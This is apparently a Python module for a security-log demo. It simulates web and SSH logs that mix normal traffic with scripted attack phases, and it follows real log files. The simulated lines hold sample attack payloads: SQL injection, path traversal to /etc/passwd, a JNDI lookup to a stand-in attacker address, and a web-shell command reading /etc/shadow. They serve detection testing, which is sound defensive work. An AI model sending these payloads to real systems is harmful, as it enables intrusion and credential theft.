"""Log sources: a realistic attack simulator (for demos) and a file tailer (for real logs)."""
import random
import re
import time
from datetime import datetime

IP_RE = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b")


def extract_ip(line: str):
    m = IP_RE.search(line)
    return m.group(1) if m else None


def _ts():
    return datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0600")


def _web(ip, method, path, code, size, ua="Mozilla/5.0"):
    return f'{ip} - - [{_ts()}] "{method} {path} HTTP/1.1" {code} {size} "-" "{ua}"'


def _auth(msg):
    return f"{datetime.now().strftime('%b %d %H:%M:%S')} web01 sshd[2211]: {msg}"


def simulate(rate_per_sec: float = 8.0, seed: int = 7):
    """Yields log lines forever: normal traffic with scripted attack phases mixed in."""
    rnd = random.Random(seed)
    users = ["192.168.1.%d" % i for i in range(10, 40)]
    normal_paths = ["/", "/index.html", "/products", "/api/items", "/login", "/static/app.js", "/about"]
    attacker = "203.0.113.66"

    def normal():
        ip = rnd.choice(users)
        return _web(ip, "GET", rnd.choice(normal_paths), 200, rnd.randint(300, 9000))

    probe = [
        lambda: _web(attacker, "GET", "/admin", 404, 162, "Nmap Scripting Engine"),
        lambda: _web(attacker, "GET", "/wp-login.php", 404, 162, "Nikto/2.5"),
        lambda: _web(attacker, "GET", "/.env", 403, 162, "Nikto/2.5"),
        lambda: _auth(f"Failed password for invalid user admin from {attacker} port 51022 ssh2"),
        lambda: _auth(f"Failed password for root from {attacker} port 51044 ssh2"),
    ]
    exploit = [
        lambda: _web(attacker, "GET", "/products?id=1'%20OR%20'1'='1", 500, 340, "sqlmap/1.8"),
        lambda: _web(attacker, "GET", "/products?id=1%20UNION%20SELECT%20user,pass%20FROM%20users--", 200, 1290, "sqlmap/1.8"),
        lambda: _web(attacker, "GET", "/download?file=../../../../etc/passwd", 200, 1830, "curl/8.5"),
        lambda: _web(attacker, "GET", "/search?q=${jndi:ldap://203.0.113.66/a}", 200, 120, "curl/8.5"),
        lambda: _web(attacker, "POST", "/upload.php?cmd=cat%20/etc/shadow", 200, 90, "curl/8.5"),
    ]
    intrusion = [
        lambda: _auth(f"Accepted password for root from {attacker} port 51090 ssh2"),
        lambda: _auth("pam_unix(sshd:session): session opened for user root by (uid=0)"),
        lambda: _auth("sudo: www-data : TTY=pts/0 ; COMMAND=/bin/bash"),
    ]

    # script: (events to emit, generator pool). Phases interleaved with normal traffic.
    script = (
        [normal] * 40
        + probe * 3
        + [normal] * 15
        + exploit * 2
        + [normal] * 10
        + probe[3:] * 3
        + intrusion
        + [normal] * 40
    )
    delay = 1.0 / rate_per_sec
    i = 0
    while True:
        gen = script[i % len(script)]
        yield gen()
        i += 1
        time.sleep(delay)


def tail(path: str, from_start: bool = False, poll: float = 0.1):
    """Follow a real log file like `tail -f`."""
    with open(path, "r", errors="replace") as f:
        if not from_start:
            f.seek(0, 2)
        while True:
            line = f.readline()
            if not line:
                time.sleep(poll)
                continue
            line = line.strip()
            if line:
                yield line
